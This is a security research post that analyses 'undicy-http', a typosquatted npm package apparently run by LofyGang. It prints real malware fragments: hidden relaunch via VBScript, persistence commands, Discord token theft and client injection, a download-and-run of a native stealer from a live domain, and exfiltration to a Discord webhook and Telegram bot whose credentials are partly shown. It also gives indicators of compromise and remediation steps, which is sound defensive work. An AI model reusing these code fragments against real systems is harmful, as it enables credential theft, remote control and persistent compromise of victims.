---
excerpt: The JFrog Security research team identified a malicious npm package undicy-http (version 2.0.0) masquerading as the popular undici HTTP client library. Despite its name, the package contains zero HTTP client functionality.
title: "LofyGang Returns: From Fake undici to Full System Compromise via Parallel Data Theft"
date: "March 31, 2026"
description: "Meitar Palas, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/lofygang-returns/thumbnail.png
type: realTimePost
minutes: '10'
---

The JFrog Security research team identified a malicious npm package `undicy-http` (version 2.0.0) masquerading as the popular `undici` HTTP client library. Despite its name, the package contains zero HTTP client functionality. Instead, it delivers a **dual-payload attack**: a Node.js-based Remote Access Trojan (RAT) with live screen streaming, and a **native Windows PE binary** that uses direct syscalls to inject into browser processes and steal credentials, cookies, credit cards, IBANs, and session tokens from **50+ browsers** and **90+ cryptocurrency wallet extensions**.

The most significant finding is the native second-stage payload (`chromelevator.exe`), a compiled x86-64 Windows executable that performs **process hollowing via direct syscalls**, allocating memory, writing shellcode, and creating remote threads without calling the standard `ntdll.dll` APIs. This technique bypasses user-mode hooks from EDR and antivirus products. The injector communicates with its injected payload through named pipes, decrypts an AES-encrypted internal payload at runtime, and exfiltrates stolen data through both a Discord webhook and a Telegram bot. The Node.js layer independently operates as a full RAT with remote shell, screen capture, webcam/microphone streaming, file upload, and persistence capabilities, all controlled through a WebSocket C2 panel.  
The binary also matches the YARA rule `MAL_Browser_Stealer_Dec25_2`, authored by X\_\_Junior and published through Nextron Systems' [VALHALLA rule feed](https://valhalla.nextron-systems.com/info/rule/MAL_Browser_Stealer_Dec25_2). The rule is described as detecting "a loader that loads a browser stealer part of GlassWorm Campaign," a broader supply chain attack framework [documented by Malwarebytes](https://www.malwarebytes.com/blog/news/2026/03/glassworm-attack-installs-fake-browser-extension-for-surveillance) and others that targets developers through compromised packages across npm, PyPI, and GitHub. The rule has matched over 1,750 malicious samples since its creation in December 2025, with new matches appearing daily through March 2026, indicating an active and prolific campaign. This suggests `chromelevator.exe` is not unique to LofyGang but rather a component of the broader GlassWorm campaign, reused here alongside LofyGang's own npm typosquatting infrastructure and exfiltration channels.

This package represents a major escalation from previously documented LofyGang campaigns, which relied exclusively on JavaScript payloads for Discord token theft and credit card harvesting. The addition of a native binary with syscall-level process injection, combined with a multi-channel exfiltration architecture (Discord, Telegram, gofile.io, catbox.moe) and an extensive target list spanning gaming, social media, and cryptocurrency platforms, makes this one of the most comprehensive npm supply chain payloads observed from this threat actor.

## Infrastructure Summary

| IP / Domain | Role | Hosting | ASN | Status |
| :---- | :---- | :---- | :---- | :---- |
| `24[.]152[.]36[.]243:3000` | WebSocket C2 (RAT panel) | Master da Web Datacenter LTDA (Brazil) | AS270564 | N/A |
| `amoboobs[.]com` | Native payload delivery (`chromelevator.exe`) | Cloudflare (172\[.\]67\[.\]173\[.\]92) | AS13335 | Live |
| `ptb[.]discord[.]com` | Exfiltration via webhook | Discord | N/A | Live |
| `api[.]telegram[.]org` | Exfiltration via bot API | Telegram | N/A | Live |
| `gofile[.]io` / `catbox[.]moe` | Bulk file upload (archives) | Various | N/A | Live |
| `ipinfo[.]io` / `myexternalip[.]com` | Victim IP geolocation | Various | N/A | Live |

## Package Delivery

The package uses a straightforward typosquatting strategy, impersonating `undici`, the official HTTP/1.1 and HTTP/2 client bundled with Node.js.

```json
{
  "name": "undicy-http",
  "bin": "index.js",
  "version": "2.0.0",
  "author": "ConsoleLofy",
  "dependencies": {
    "@primno/dpapi": "^2.0.1",
    "adm-zip": "^0.5.16",
    "archiver": "^7.0.1",
    "axios": "^1.9.0",
    "koffi": "^2.15.2",
    "rcedit": "^4.0.1",
    "screenshot-desktop": "^1.15.3",
    "sqlite3": "^5.1.7",
    "ws": "^8.18.2"
  },
  "pkg": {
    "targets": ["node20-win-x64"]
  }
}
```

The dependency list is a clear signal of malicious intent:

* `@primno/dpapi`: Windows DPAPI decryption of browser master keys  
* `sqlite3`: Reading Chromium `Login Data` and `Cookies` databases  
* `koffi`: Native FFI calls to Windows APIs  
* `screenshot-desktop`: Screen capture for the RAT  
* `ws`: WebSocket connection to C2 server  
* `archiver` / `adm-zip`: Archiving stolen data before exfiltration  
* `rcedit`: Modifying PE resource metadata  
* `@yao-pkg/pkg` (dev): Compiling the Node.js payload into a standalone `.exe`

The author field `ConsoleLofy` contains the keyword `Lofy`, matching the closed dictionary of aliases used by the **LofyGang** threat group (documented by [Checkmarx in October 2022](https://checkmarx.com/blog/lofygang-software-supply-chain-attackers-organized-persistent-and-operating-for-over-a-year/)). The code itself confirms attribution with hardcoded strings `"Lofygang"`, `"t.me/lofygang"`, and Discord embed author names like `"Lofygang (Roblox Session)"`.

There is no `postinstall` or `preinstall` trigger. The `bin` field points directly to `index.js`, meaning the payload executes when the package binary is invoked.

## Entry Point: Hidden Execution via VBScript

The very first thing `index.js` does upon execution is check if it's already running hidden. If not, it creates a VBScript file to re-launch itself as a windowless process:

```javascript
if (!process.env._NYX_HIDDEN) {
    const var_18 = path.join(os.tmpdir(), "_nyx_launch.vbs");
    const var_22 = "Set objShell = CreateObject(\"WScript.Shell\")\r\n"
        + "Set objEnv = objShell.Environment(\"Process\")\r\n"
        + "objEnv(\"_NYX_HIDDEN\") = \"1\"\r\n"
        + "objShell.Run \"\"\"" + process.execPath + "\"\" " + args + "\", 0, False\r\n";
    fs.writeFileSync(var_18, var_22);
    child_process.spawn("wscript.exe", [var_18], { detached: true, stdio: "ignore" }).unref();
    process.exit(0);
}
```

The `0` parameter to `objShell.Run` sets the window style to hidden. The environment variable `_NYX_HIDDEN` prevents an infinite re-launch loop.

## **RAT Component**

After the hidden re-launch, the payload connects to a WebSocket C2 server at `ws://24[.]152[.]36[.]243:3000` and registers as a client:

```javascript
const var_53 = process.env.SERVER_URL || "ws[:]//24[.]152[.]36[.]243:3000";
const var_68 = var_53 + "/?role=client&name=" + encodeURIComponent(hostname)
    + "&monitors=" + displays.length;
```

The C2 connection supports the following remote commands:

- `exec`: Remote shell execution (arbitrary commands)  
- `select`: Switch between victim's monitors  
- `upload`: Upload files to the victim's machine  
- `action`: Enable/disable screen streaming  
- `mic_start` / `mic_stop`: Record victim's microphone  
- `webcam_list` / `webcam_start` / `webcam_stop`: Enumerate and stream webcam  
- `talk_start` / `talk_audio` / `talk_stop`: Play audio through victim's speakers

Screen capture is implemented using `screenshot-desktop` and resized via PowerShell's `System.Drawing` API before streaming over WebSocket. The RAT labels itself `"ScreenLiveClient"` and prints Portuguese status messages (`"Conectado ao servidor"`, `"monitor(es) detectado(s)"`), consistent with LofyGang's Brazilian origin.

## Persistence

The malware establishes persistence through three mechanisms in sequence, falling back if one fails:

1. **Scheduled Task**: Runs at logon with highest privileges:

```javascript
execSync('schtasks /Create /TN "ScreenLiveClient" /TR "wscript.exe \\"'
    + vbsPath + '\\"" /SC ONLOGON /RL HIGHEST /F');
```

2. **Registry Run Key**: Fallback if `schtasks` fails:

```javascript
execSync('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
    + ' /v "ScreenLiveClient" /t REG_SZ /d "wscript.exe \\"' + vbsPath + '\\"" /f');
```

3. **Startup Folder**: Copies the executable to the Windows Startup directory.

The VBScript launcher (`%TEMP%\svchost.vbs`) is marked hidden via `attrib +h +s` to avoid casual discovery.

## Anti-Analysis

### Anti-VM / Sandbox Detection

The malware implements a comprehensive `AntiVM` class with **10 distinct checks**:

- **MAC Address**: Flags VM vendor prefixes (VMware, VirtualBox, Hyper-V, QEMU, Xen, Parallels)  
- **BIOS**: Scans `wmic bios get serialnumber,version` for VM identifiers  
- **Disk**: Checks `wmic diskdrive` for virtual disk names (VBOX, VMWARE, QEMU)  
- **Processes**: Scans running processes for analysis tools (Wireshark, Procmon, x64dbg, IDA, Ghidra, Fiddler, Cuckoo, ANY.RUN, Triage, etc.)  
- **Username**: Flags common sandbox usernames (`sandbox`, `malware`, `virus`, `sample`, `test`, `admin`)  
- **Recent files**: Checks for analysis-related recent files  
- **Desktop files**: Scans desktop for VM/analysis indicators  
- **Registry**: Probes for VirtualBox Guest Additions, VMware Tools, and Hyper-V keys  
- **Running services**: Checks for `vmtoolsd`, `vboxservice`, `sandboxie` services  
- **System paths**: Looks for `C:\analysis`, `C:\sandbox`, `C:\tools`, `C:\program files\oracle\virtualbox guest additions`, `C:\program files\VMware`

### Fake DLL Error

After anti-VM checks pass, the malware displays a fake Windows error dialog via VBScript to deceive the user:

```javascript
const var_1229 = ["MSVCR100.dll", "MSVCP140.dll", "VCRUNTIME140.dll",
    "api-ms-win-crt-runtime-l1-1-0.dll", "ucrtbase.dll"][Math.floor(Math.random() * 5)];
const var_1230 = 'WshShell.Popup "The program can\'t start because '
    + var_1229 + ' is missing from your computer.", 0, "System Error", 16';
```

This makes the victim believe the program failed to run, when in reality the payload is executing silently in the background.

### Anti-Debugging

The entry point contains a self-invoking function that uses regex matching and `debugger` statements to stall analysis tools:

```javascript
const var_11 = new RegExp("function *\\( *\\)");
const var_12 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
// If deobfuscation detected, enter infinite loop
if (!var_11.test(var_13 + "chain") || !var_12.test(var_13 + "input")) {
    var_13("0"); // -> while(true){}
}
```

## **Data Theft** 

### Discord Token Theft

Targets **4 Discord variants** (Stable, Canary, PTB, Development) and **50+ browsers** by scanning `Local Storage/leveldb` for token patterns:

```javascript
const var_205 = [
    new RegExp(/mfa\.[\w-]{84}/g),           // MFA tokens
    new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)  // Standard tokens
];
```

For Discord installations with encrypted tokens (prefix `dQw4w9WgXcQ:`), the malware:

1. Reads `Local State` to extract the encrypted AES master key  
2. Decrypts it via Windows DPAPI (using `@primno/dpapi` or a PowerShell fallback)  
3. Uses AES-256-GCM to decrypt the token

For each stolen token, the malware queries the Discord API (`/api/v10/users/{id}/profile`, `/api/v9/users/@me/billing/payment-sources`) to enrich the exfiltrated data with badges, billing info, Nitro status, and "HQ friends" (accounts with rare badges).

### Discord Client Injection

The malware overwrites `discord_desktop_core/index.js` in all installed Discord variants with remotely fetched injection code, replacing the `%WEBHOOK_REPLACE_NYX%` placeholder with the attacker's exfiltration endpoint:

```javascript
var_370 = var_370.replace(/%WEBHOOK_REPLACE_NYX%/g, var_371);
fs.writeFileSync(var_367, arg_164, "utf8");
// [Injection] Injected: %LOCALAPPDATA%\Discord\app-X.X.X\modules\
//     discord_desktop_core-X\discord_desktop_core\index.js
```

After injection, Discord processes are killed and relaunched via `Update.exe --processStart`, ensuring the injected code runs immediately.

### Browser Data (50+ Browsers)

The malware targets an extensive list of Chromium-based browsers (Chrome, Chrome Beta/Dev/Canary, Edge, Edge Beta/Dev/Canary, Brave, Opera, Opera GX, Vivaldi, Yandex, Arc, Sidekick, Slimjet, SRWare Iron, Comodo Dragon, Epic Privacy, Coc Coc, Cent, 7Star, Amigo, Torch, Sogou, UC Browser, QIP Surf, RockMelt, Flock, Bowser), Gecko-based browsers (Firefox, Firefox ESR, Pale Moon, Waterfox, Cyberfox, SeaMonkey, IceDragon, K-Meleon, Basilisk, Tor Browser), and Safari on Windows.

### Cryptocurrency Wallet Theft

**90+ browser wallet extensions** are targeted, including:

MetaMask, Phantom, Coinbase Wallet, Binance Wallet, Trust Wallet, Exodus, Atomic, OKX, Rabby, XDEFI, SafePal, Keplr, Terra Station, Nami, Eternl, Yoroi, TronLink, Ronin, Solflare, Slope, Braavos, Polymesh, Nabox, KardiaChain, Wombat, MEW CX, Guarda, EVER Wallet, Clover, Leather (Hiro), Sui Wallet, Petra Aptos, Martian Aptos, Pontem Aptos, Sender, Goby, Leap Cosmos, Core, Harmony, Enkrypt, Opera Wallet, Rainbow, Zerion, Talisman, Backpack, Fordefi, SubWallet, PolkadotJS, Compass, OWallet, Cosmostation, Frontier, Bifrost, Frame, Temple, Beacon, Kukai, Spire, Umami, Cyano, OneKey, Coin98, TokenPocket, ioPay, Auro, Leafkey, Nifty, BoltX, Saturn, Guild, Taho, Xverse, DeFi Wallet, Avail, Casper Signer, Finnie, Stargazer, Maiar DeFi, Flint Wallet, Brave Wallet, and more.

**28+ desktop wallets** are targeted:

Exodus, Atomic, Electrum, Ethereum, Monero, Bytecoin, Jaxx Liberty, Zcash, Armory, Coinomi, Guarda, Wasabi, Bitcoin Core, Litecoin Core, Dash Core, Dogecoin Core, Daedalus, Yoroi, Nami, Eternl, MultiBit, Binance.

**6 hardware/cold wallet** integrations: Ledger Live, Trezor Suite, KeepKey, BitBox.

The malware also recursively scans user directories for `wallet.dat` files and seed phrase backup files matching patterns like `/wallet.*backup/i`.

For Exodus specifically, it attempts to crack the wallet password using PBKDF2:

```javascript
const var_747 = crypto.pbkdf2Sync(arg_217, "exodus", 1e4, 32, "sha512");
```

### Session Hijacking

- **Roblox**: `.ROBLOSECURITY` cookie, username, display name, user ID, Robux balance, profile URL  
- **Instagram**: Session cookie, username, full name, follower/following counts, profile picture, bio, email, phone, account type (business/personal), verification status  
- **Spotify**: `sp_dc` cookie, username, email, subscription plan, country, account creation date, profile URL  
- **TikTok**: `sessionid` cookie, username, user ID, email, follower/following/like counts, coin balance, profile URL  
- **Steam**: Full `config` directory (zipped), Steam ID, username, level, game count, profile creation date. Uses hardcoded Steam API key `440D7F4D810EF9298D25EDDF37C1F902`  
- **Telegram**: `tdata` directory (zipped), containing local session data  
- **Discord**: Backup codes scanned from Desktop, Documents, Downloads, Videos, Pictures, Music directories

### System Profiling

Before exfiltration, the malware collects:

- Public IP (via `ipinfo[.]io` and `myexternalip[.]com`)  
- Geolocation (country, city, region, ISP)  
- Hostname, OS version, CPU model, core count, RAM  
- System uptime  
- Installed antivirus (scans for Avast, McAfee, Norton, Kaspersky, BitDefender, ESET, AVG, Malwarebytes, Sophos)

## **Native Binary Payload** 

The Node.js layer downloads and executes a native PE binary from `hxxp[://]amoboobs[.]com/arquivos/chromelevator.exe`:

```javascript
const var_519 = CONFIG.exeUrl; // "hxxp[:]//amoboobs[.]com/arquivos/chromelevator.exe"
let var_521 = fn_51(); // Try Defender exclusion paths first
if (!var_521) {
    var_521 = path.join(os.tmpdir(), "WinSvcHost");
}
const response = await axios.get(var_519, { responseType: "arraybuffer" });
fs.writeFileSync(path.join(var_521, "chromelevator.exe"), Buffer.from(response.data));
spawn(exePath, [], { stdio: "ignore", detached: true, windowsHide: true }).unref();
```

The download function (`fn_52`) first queries Windows Defender exclusion paths via PowerShell and drops the binary there if possible. If not, it falls back to `%TEMP%\WinSvcHost`. Execution has three fallback strategies: direct spawn, `cmd.exe /c start /b`, and a VBScript `ShellExecute "runas"` (UAC bypass attempt).

### VirusTotal Findings:

The full VirusTotal analysis is available [here](https://www.virustotal.com/gui/file/d6090c843c58f183fb5ed3ab3f67c9d96186d1b30dfd9927b438ff6ffedee196). The payload is served from `172[.]67[.]173[.]92` behind Cloudflare.

![](/img/RealTimePostImage/post/lofygang-returns/VT_screen.png)

## Exfiltration

The malware uses dual exfiltration channels that operate in parallel:

**Discord Webhook:**

```javascript
CONFIG.webhook = "https://ptb.discord.com/api/webhooks/1484725829412851915/54vteo...";
axios.post(CONFIG.webhook, payload, { headers: { "Content-Type": "application/json" } });
```

**Telegram Bot API** (base64-encoded URL construction):

```javascript
CONFIG.telegram.token = "8713069597:AAEcZWknr3IsA7QFvh-FqeYdjw5WaKKf-Uk";
CONFIG.telegram.chatId = "8245283894";
// Decoded: "https://api.telegram.org" + "/bot" + token + "/sendMessage"
const telegramUrl = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn") + "/"
    + atob("Ym90") + token + "/" + atob("c2VuZE1lc3NhZ2U=") + "?chat_id=" + chatId;
```

Large files (wallet data, Telegram `tdata`, Steam config) are first uploaded to **gofile.io** (with multiple server fallback) or **catbox.moe**, and the download link is sent via the webhook/Telegram.

## Infection Vector Assessment

**Classification: Typosquatting**

The package name `undicy-http` is a deliberate misspelling of `undici`, the official HTTP client library maintained by the Node.js project. The `undici` package averages millions of weekly downloads, making its namespace a high-value typosquatting target. The package contains no legitimate HTTP client code whatsoever.

**Threat actor attribution: LofyGang**

Multiple indicators link this package to the LofyGang group:

* Author field: `"ConsoleLofy"` (contains `Lofy` keyword)  
* Hardcoded strings: `"=== Lofygang Started ==="`, `"Lofygang | t.me/lofygang"`, webhook usernames set to `"Lofygang"`  
* Portuguese-language log messages throughout the code (`"Conectado ao servidor"`, `"monitor(es) detectado(s)"`, `"Tarefa agendada removida"`)  
* Discord injection technique consistent with previously documented LofyGang payloads  
* Folder name `"lofygang-local"` used for staging stolen data

## **Remediation**

1. **Uninstall the package** immediately: `npm uninstall undicy-http`  
2. **Kill running processes**: Look for `node` or `wscript.exe` processes with command lines containing `client.js --bg`, `_nyx_launch.vbs`, or `svchost.vbs`  
3. **Remove persistence artifacts**:  
   - Delete scheduled task: `schtasks /Delete /TN "ScreenLiveClient" /F`  
   - Remove registry key: `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ScreenLiveClient" /f`  
   - Delete `%TEMP%\_nyx_launch.vbs` and `%TEMP%\svchost.vbs` (unhide first: `attrib -h -s`)  
   - Check Startup folder for copies of the executable  
4. **Remove dropped payloads**: Delete `chromelevator.exe` from Windows Defender exclusion paths and `%TEMP%\WinSvcHost\`  
5. **Remove staging directory**: Delete `%LOCALAPPDATA%\lofygang-local\`  
6. **Restore Discord**: Reinstall all Discord variants to remove injected `discord_desktop_core/index.js`  
7. **Rotate all credentials**:  
   - All browser-saved passwords  
   - Discord tokens (change password, enable 2FA, regenerate backup codes)  
   - Roblox, Instagram, Spotify, TikTok, Steam, Telegram sessions  
8. **Move cryptocurrency assets** immediately if any targeted wallets were installed. Generate new seed phrases on a clean machine.  
9. **Revoke all browser sessions** across all browsers  
10. **Block C2 addresses**: `24[.]152[.]36[.]243`, `amoboobs[.]com`  
11. **Re-image the machine** if `chromelevator.exe` was executed, as the native payload operates at a level where full system trust cannot be restored through manual cleanup

## **Conclusions**

This package represents a significant evolution in LofyGang's capabilities. Previous campaigns (documented in 2022\) used JavaScript-only payloads for Discord token theft and credit card interception via client injection. `undicy-http@2.0.0` introduces a **compiled native binary** with syscall-level process injection, a **full-featured WebSocket RAT** with multimedia capture, and an **extensive session hijacking module** covering six major platforms, none of which were present in earlier LofyGang tooling.

The scope of data targeted is exceptional: **50+ browser families**, **90+ wallet extensions**, **28+ desktop wallets**, **6 hardware wallet integrations**, and session data from **6 non-browser platforms** (Roblox, Instagram, Spotify, TikTok, Steam, Telegram). The Exodus wallet module even attempts offline password cracking via PBKDF2. Combined with live screen/webcam/microphone streaming and remote shell access, this package provides a near-total compromise of a victim's sensitive data.

The attacker invested considerable effort in evasion: 10-point anti-VM detection, fake DLL error dialogs, anti-debugging traps, VBScript hidden execution, Defender exclusion path abuse for payload delivery, and direct syscalls in the native binary to bypass EDR hooks. Detection should focus on: outbound WebSocket connections from npm package contexts, `schtasks` or `reg add` execution during package installation, and file writes to `discord_desktop_core/index.js` from non-Discord processes.

This package is already detected by JFrog Xray and JFrog Curation, under the Xray ID listed in the IoC section below.

## Indicators of Compromise

| Indicator | Value |
| :---- | :---- |
| **Package** |  |
| Package Name | `undicy-http` |
| Package Type | npm |
| Version | 2.0.0 |
| Author | ConsoleLofy |
| XRAY-ID | XRAY-958718 |
| **C2 Infrastructure** |  |
| WebSocket C2 | `ws[://]24[.]152[.]36[.]243:3000` |
| C2 Hosting | Master da Web Datacenter LTDA (Brazil), AS270564 |
| Payload Domain | `hxxp[://]amoboobs[.]com/arquivos/chromelevator.exe` |
| Payload Serving IP | `172[.]67[.]173[.]92` (Cloudflare) |
| Payload DNS | `188[.]114[.]97[.]7`, `188[.]114[.]96[.]7` (Cloudflare) |
| **Exfiltration** |  |
| Discord Webhook | `hxxps[://]ptb[.]discord[.]com/api/webhooks/148………………/54v…` |
| Telegram Bot Token | `8713069597:AAEcZW…………` |
| Telegram Chat ID | `8245283894` |
| Steam API Key | `440D7F4D810EF929……………` |
| File Upload | `gofile[.]io`, `catbox[.]moe` |
| IP Lookup | `ipinfo[.]io/json`, `myexternalip[.]com/raw` |
| **Native Binary** |  |
| Filename | `chromelevator.exe` |
| SHA256 | `d6090c843c58f183fb5ed3ab3f67c9d96186d1b30dfd9927b438ff6ffedee196` |
| File Size | 1,458,176 bytes |
| Type | PE32+ executable (GUI) x86-64, Windows |
| Linked DLLs | `KERNEL32.dll`, `ADVAPI32.dll`, `WINHTTP.dll`, `VERSION.dll` |
| VT First Seen | 2026-03-21 |
| Server Last-Modified | 2026-03-21 13:45:20 UTC |
| **Persistence** |  |
| Scheduled Task | `ScreenLiveClient` (ONLOGON, HIGHEST) |
| Registry Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScreenLiveClient` |
| Dropped VBS | `%TEMP%\_nyx_launch.vbs`, `%TEMP%\svchost.vbs` |
| Staging Directory | `%LOCALAPPDATA%\lofygang-local\` |
| Payload Drop Path | `%TEMP%\WinSvcHost\chromelevator.exe` (or Defender exclusion path) |
| **Attribution** |  |
| Threat Group | LofyGang |
| Telegram Channel | `t[.]me/lofygang` |
| Origin | Brazil (Portuguese-language strings, LACNIC IP space) |
